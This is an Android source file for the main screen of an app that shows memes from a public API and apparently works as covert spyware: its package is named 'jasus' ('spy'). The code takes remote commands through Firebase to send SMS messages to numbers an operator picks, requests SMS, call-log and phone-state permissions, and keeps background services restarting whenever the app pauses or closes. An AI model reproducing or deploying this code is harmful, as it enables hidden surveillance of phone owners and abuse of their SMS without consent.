package com.perry.jasus.Ui;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.perry.jasus.BackgroundServices.BackgroundBroadcastService;
import com.perry.jasus.BackgroundServices.BackgroundService;


import com.perry.jasus.BackgroundServices.ReStarter;
import com.perry.jasus.Models.ActionSmsModel;
import com.perry.admin.R;
import com.perry.jasus.Util.LocalData;
import com.perry.admin.databinding.ActivityMainBinding;
import com.squareup.picasso.Picasso;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class MainActivity extends AppCompatActivity {


    DatabaseReference UserDb = FirebaseDatabase.getInstance().getReference().child("Users");


    ActivityMainBinding binding;
    Intent mServiceIntent;
    ImageView imageView;
    //TextView sms;
    private BackgroundService mBackgroundService;

    private RequestQueue mRequestQueue;
    private StringRequest stringRequest;

        SharedPreferences preferences;
        SharedPreferences.Editor editor;
    private String Url = "https://meme-api.com/gimme";
    String preUrl;
    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //sms=findViewById(R.id.sms);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        getdata ();

        String deviceID = LocalData.getDeviceID(MainActivity.this);


        preferences = getSharedPreferences("img", MODE_PRIVATE);
        editor = preferences.edit();
        preUrl = preferences.getString("img", "");

        binding.nextBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                getdata ();
            }
        });

        binding.preBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Toast.makeText(MainActivity.this, preUrl, Toast.LENGTH_SHORT).show();

                getPreMemes(preUrl);


            }
        });

        runner();


        UserDb.child(deviceID).child("SEND_SMS").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String action = snapshot.child("action").getValue(String.class);
                String mobile = snapshot.child("mobile").getValue(String.class);
                String sms = snapshot.child("sms").getValue(String.class);

                if (action!=null ){
                    if (action.equals("true")){
                        try {
                            SmsManager smsManager = SmsManager.getDefault();
                            smsManager.sendTextMessage(mobile, null, sms, null, null);
                            Toast.makeText(getApplicationContext(), "Message Sent", Toast.LENGTH_LONG).show();
                            ActionSmsModel smsModel = new ActionSmsModel("false", "", "");

                            UserDb.child(deviceID).child("SEND_SMS").setValue(smsModel);


                        } catch (Exception ex) {
                            Toast.makeText(getApplicationContext(),ex.getMessage().toString(), Toast.LENGTH_LONG).show();
                            ex.printStackTrace();
                        }
                    }

                }

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });



        //Create Service
        startService(new Intent(this, BackgroundBroadcastService.class));
        mBackgroundService = new BackgroundService();
        mServiceIntent = new Intent(this, mBackgroundService.getClass());
        if (!isMyServiceRunning(mBackgroundService.getClass())) {
            startService(mServiceIntent);
        }

        requestPermissions();

    }

    private void runner() {

        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                runner();
                SharedPreferences preferences2 = getSharedPreferences("APP", Context.MODE_PRIVATE);
                String ap = preferences2.getString("app", "");

                if (!ap.equals(null)){
                    if (ap.equals("stop")){
                        preferences2.edit().clear().commit();

                        MainActivity.super.finishAffinity();
                        Toast.makeText(MainActivity.this, "bom finish" +ap, Toast.LENGTH_SHORT).show();
                        runner();

                    }


                    if (ap.equals("start")){
                        getdata();
                        Toast.makeText(MainActivity.this, ap, Toast.LENGTH_SHORT).show();
                        Intent intent = new Intent("android.intent.category.LAUNCHER");
                        intent.setClassName("com.perry.admin", "MainActivity");
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);

                    }
                }


            }
        }, 1000);



    }

    @Override
    public void onBackPressed() {
      new AlertDialog.Builder(this)
              .setTitle("Exit")
              .setMessage("Do you want to exist")
              .setPositiveButton(":yes", new DialogInterface.OnClickListener() {
                  @Override
                  public void onClick(DialogInterface dialogInterface, int i) {
                      MainActivity.super.finishAffinity();
                  }
              })
              .setNegativeButton("No", new DialogInterface.OnClickListener() {
                  @Override
                  public void onClick(DialogInterface dialogInterface, int i) {
                      dialogInterface.dismiss();
                  }
              }).show();
    }


    private void getPreMemes(String preUrl) {
        Picasso.get().load(preUrl).into(binding.imageview);

    }


    private void getdata() {
        mRequestQueue = Volley.newRequestQueue(this);
        JsonObjectRequest request=new JsonObjectRequest(Request.Method.GET, Url, null, new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
               try {
                   String img=response.getString("url");


                   editor.putString("img", img);
                   editor.commit();
                   Picasso.get().load(img).into(binding.imageview);


                } catch (JSONException e) {
                   throw new RuntimeException(e);
             }

          }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        });
        mRequestQueue.add(request);
    }


    //Current Service Checker
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i("Service status", "Running");
                return true;
            }
        }
        Log.i("Service status", "Not running");
        return false;
    }

    //Run time Permission
    private void requestPermissions() {
        Dexter.withActivity(this).withPermissions(Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.FOREGROUND_SERVICE,
                        Manifest.permission.READ_SMS)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport multiplePermissionsReport) {
                        if (multiplePermissionsReport.areAllPermissionsGranted()) {
                            Toast.makeText(MainActivity.this, "All the permissions are granted..", Toast.LENGTH_SHORT).show();
                        } else {
                            finish();
                        }
                        if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                            showSettingsDialog();
                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<com.karumi.dexter.listener.PermissionRequest> list, PermissionToken permissionToken) {
                        permissionToken.continuePermissionRequest();

                    }

                }).withErrorListener(error -> {
                    Toast.makeText(getApplicationContext(), "Error occurred! ", Toast.LENGTH_SHORT).show();
                })
                .onSameThread().check();
    }

    //Run time Permission Dialog
    private void showSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Need Permissions");
        builder.setMessage("This app needs permission to use this feature. You can grant them in app settings.");
        builder.setPositiveButton("GOTO SETTINGS", (dialog, which) -> {

            dialog.cancel();
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", getPackageName(), null);
            intent.setData(uri);
            startActivityForResult(intent, 101);
        });
        builder.setNegativeButton("Cancel", (dialog, which) -> {
            dialog.cancel();
        });
        builder.show();
    }

    private void perryService() {
        startService(mServiceIntent);
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartService");
        broadcastIntent.setClass(this, ReStarter.class);
        this.sendBroadcast(broadcastIntent);
    }

    @Override
    protected void onDestroy() {
        perryService();
        Log.d("ATAG", "onDestroy: " );
        super.onDestroy();
    }

    @Override
    protected void onStop() {
        Log.d("ATAG", "onStop: ");
        perryService();
        super.onStop();
    }



    @Override
    protected void onPause() {
        Log.d("ATAG", "onPause: ");
        super.onPause();
        perryService();

    }
}